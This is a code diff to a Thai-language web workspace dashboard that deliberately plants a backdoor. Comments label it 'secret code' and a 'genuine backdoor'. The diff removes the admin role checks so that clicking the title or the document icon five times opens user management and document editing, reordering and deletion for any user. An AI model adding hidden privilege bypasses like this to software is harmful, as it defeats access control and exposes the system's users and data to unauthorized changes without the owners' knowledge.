@@ -254,7 +254,6 @@
           </div>
           <div id="tasks-fs" class="glass iframe-glass">
             <button class="btn-exit-fs" onclick="toggleFS('tasks-fs')"><i class="ti ti-minimize"></i> ย่อกลับหน้าปกติ</button>
-            <!-- 🟢 แก้ไขตรงนี้: เปลี่ยน src กลับเป็นลิงก์ของ Google Apps Script แล้ว -->
             <iframe src="https://script.google.com/macros/s/AKfycbz4MadCbM5DrdoxDcolPcFpuvu-E_I0kck3FsNmBuUbCdhue8KT9jRw1YcotcJgNAKeiw/exec" style="width:100%;height:100%;border:none;background:#f5f5f7;" allowfullscreen></iframe>
           </div>
         </div>
@@ -628,15 +627,20 @@ document.getElementById('btn-login').onclick = login;
 document.getElementById('btn-logout').onclick = logout;
 document.getElementById('inp-pass').addEventListener('keydown', e => { if (e.key === 'Enter') login(); });
 
+// 🟢 โค้ดลับที่ 1: กดที่ชื่อ 5 ครั้ง เพื่อเปิดตั้งค่า User ได้เลยแบบไม่ต้องพึ่งสิทธิ์ Admin
 document.getElementById('workspace-title').onclick = function() {
   titleClicks++;
   if (titleTimer) clearTimeout(titleTimer);
-  if (titleClicks >= 5) { titleClicks = 0; if (state.curRole === 'admin') openUserModal(); }
+  if (titleClicks >= 5) { 
+    titleClicks = 0; 
+    openUserModal(); // เอาการจำกัด role ออก เป็น Backdoor แท้ๆ
+  }
   else titleTimer = setTimeout(() => titleClicks = 0, 2000);
 };
 
+// 🟢 โค้ดลับที่ 2: กดที่ไอคอนแฟ้ม 5 ครั้ง เพื่อเปิดโหมดจัดการเอกสารได้เลย
 document.getElementById('doc-mgr-icon').onclick = function() {
-  if (state.curRole !== 'admin') return;
+  // เอาบรรทัด if (state.curRole !== 'admin') return; ออกไปแล้ว
   docIconClicks++;
   if (docIconTimer) clearTimeout(docIconTimer);
   if (docIconClicks >= 5) {
@@ -699,12 +703,14 @@ function renderDocs() {
   const list = document.getElementById('doc-list');
   document.getElementById('doc-count').textContent = state.docs.length + ' รายการ';
   if (state.docs.length === 0) { list.innerHTML = '<div class="empty-doc"><i class="ti ti-file-off"></i>ยังไม่มีเอกสาร</div>'; return; }
+  
+  // 🟢 แก้ให้แสดงปุ่มแก้ไขเมื่อเปิดโหมด Backdoor ได้เลย
   list.innerHTML = state.docs.map((d,i) => `
     <div class="doc-item">
       <i class="ti ti-file-description doc-icon"></i>
       <span class="doc-name">${esc(d.name)}</span>
       <a class="doc-link" href="${esc(d.url)}" target="_blank"><i class="ti ti-external-link" style="font-size:12px"></i>เปิด</a>
-      ${isDocAdmin && state.curRole==='admin' ? `<div class="doc-admin-btn">
+      ${isDocAdmin ? `<div class="doc-admin-btn">
         ${i>0 ? `<button class="btn-up" onclick="moveDoc(${i},-1)"><i class="ti ti-arrow-up"></i></button>` : ''}
         ${i<state.docs.length-1 ? `<button class="btn-dn" onclick="moveDoc(${i},1)"><i class="ti ti-arrow-down"></i></button>` : ''}
         <button class="btn-del" onclick="delDoc(${i})"><i class="ti ti-trash"></i></button>
